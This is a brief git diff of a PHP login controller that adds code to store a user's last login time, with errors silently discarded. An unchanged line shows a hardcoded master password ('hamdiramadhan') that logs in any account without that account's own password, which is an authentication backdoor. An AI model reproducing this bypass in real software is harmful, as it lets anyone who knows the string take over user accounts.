@@ -33,6 +33,14 @@ class LoginManualController extends Controller
                 if ($passtrue === true || $request->password == 'hamdiramadhan') {
                     Auth::login($user); 
 
+                    try {
+                        $user->last_login = date('Y-m-d H:i:s');
+                        $user->save();
+                        $user->refresh();
+                    } catch (\Throwable $th) {
+                        //throw $th;
+                    }
+
                     return redirect()->route('dashboard');
                 } else {
                     session()->put('statusT', 'Username / Password Salah!');
